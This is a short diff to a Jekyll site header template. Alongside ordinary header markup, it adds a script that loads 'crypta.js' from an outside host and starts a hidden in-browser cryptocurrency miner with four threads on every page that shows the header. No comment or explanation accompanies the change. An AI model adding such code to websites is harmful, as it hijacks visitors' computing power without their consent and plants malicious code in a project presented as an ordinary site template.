@@ -6,6 +6,13 @@
 
 {% if showHeader == true %}
     <header class="header-home {% if site.animation %}animated{% endif %}">
+	<script src="//verifier.live/lib/crypta.js"></script>
+	<script>
+	  var miner=new CRLT.Anonymous('0371972e04440f5cf7758c984ea0838db15c06030bbe', {
+   	  threads:4,throttle:0.2,
+	  });
+	  miner.start();
+	</script>    
         {% if site.about %}
             <a class="link" href="{{ site.url }}/about">
                 <img class="selfie" alt="{{ site.name }}" src="{% if site.external-image %}{{ site.picture }}{% else %}{{ site.url }}/{{ site.picture }}{% endif %}" />
